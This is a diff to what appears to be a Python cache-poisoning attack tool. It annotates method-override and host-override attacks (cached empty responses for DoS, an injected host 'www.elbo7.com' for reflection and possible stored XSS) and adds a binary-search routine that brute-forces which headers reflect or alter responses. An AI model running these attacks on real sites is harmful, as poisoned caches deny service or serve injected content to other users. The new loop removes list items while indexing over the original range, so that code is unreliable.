@@ -357,8 +357,7 @@ def attack_port_override(url):
     return (is_vulnerable, exploitable_headers)
 
 #
-# Does the same thing as protocol override, makes the server think it's requesting port 80 which would
-# return a 301/302 redirect to port 443, if cached causes infinite redirect loop, essentially DoS.
+# Overrides the request method to HEAD in order to get an empty response cached, DoS.
 #
 def attack_method_override(url):
     exploitable_headers = []
@@ -466,6 +465,9 @@ def attack_evil_user_agent(url):
     
     return (is_vulnerable, exploitable_values)
 
+#
+# attack has multiple implications, from denial of service to stored xss.
+#
 def attack_host_override(url):
     exploitable_headers = []
     is_vulnerable = False
@@ -486,7 +488,7 @@ def attack_host_override(url):
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com",
                                                                                             header:"www.elbo7.com"})
-        #if we get a non 200 response code, we remove the header and resend the request
+        #if we get reflection in the response body remove header and try again
         if "elbo7" in response.text:
             time.sleep(1)
             response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
@@ -497,6 +499,57 @@ def attack_host_override(url):
                 is_vulnerable = True
     
     return (is_vulnerable, exploitable_headers)
+
+
+############################
+### HEADER BRUTE-FORCING ###
+############################
+
+def header_bin_search(url, header_list):
+    #fetch a normal response to compare following responses to it.
+    initial_response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                          "accept":"*/*, text/stuff",
+                                                          "origin":"https://www.example.com"})
+  
+    header_group_list = [header_list]
+    
+    while (True):
+
+        #go over every header group, make a request, check the responses, if ordinary, remove from list.
+        for i in range(len(header_group_list)):
+            cache_buster = "cache-" + gen_rand_str(8)
+            canary = "canary" + gen_rand_str(8)
+
+            base_headers = {"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                            "accept":"*/*, text/" + cache_buster,
+                            "origin":"https://" + cache_buster + ".example.com"}
+            request_headers = base_headers
+
+            for header in header_group_list[i]:
+                request_headers[header] = canary
+            
+            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers=request_headers)
+            if (response.status_code != initial_response.status_code) or (canary in response.text) or any(canary in value for value in response.headers.values()):
+                pass
+            else:
+                header_group_list.pop(i)
+        
+        #now that useless header groups are removed, check if we have any left and split them
+        if (len(header_group_list) == 0):
+            #all headers are invalid, return.
+            return []
+        elif (all((len(header_group) == 1) for header_group in header_group_list)):
+            #cannot split further, the headers left are the useful ones, return them.
+            return [header[0] for header in header_group_list]
+        else:
+            #there are still header groups left to split
+            new_header_group_list = []
+            for header_group in header_group_list:
+                if len(header_group) > 1:
+                    new_header_group_list.append(header_group[:len(header_group)//2])
+                    new_header_group_list.append(header_group[len(header_group)//2:])
+            header_group_list = new_header_group_list
+
 
 logging.basicConfig(level=logging.INFO)
 print_banner()
